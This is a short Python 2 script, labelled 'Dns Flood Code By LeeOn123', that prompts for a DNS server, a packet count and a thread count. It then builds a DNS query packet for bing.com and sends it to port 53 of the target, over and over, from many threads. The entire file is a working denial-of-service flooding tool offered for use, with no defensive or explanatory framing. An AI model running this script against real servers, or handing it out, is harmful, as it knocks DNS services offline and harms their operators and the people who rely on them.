#!/usr/bin/env python2
import socket
import struct
import threading
'''
Dns Flood Code By LeeOn123
'''
print("[DNS Flooded]")
dns_server = raw_input("Dns server:")
times = input("Packets Number:")
threads = input("Threads:")

def run():
    while True:
        try:
            dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            req_data = struct.pack("!HBBHHHHB4sB3sBHH", 1, 1, 0, 1, 0, 0, 0, 4, "bing", 3, "com", 0, 1, 1)# DNS Query Packet
            for x in range(times):
                dns.sendto(req_data, (dns_server, 53))
            print("Packet sent!!!")
        except:
            print("Error")

for i in range(threads):
    th = threading.Thread(target = run)
    th.start()
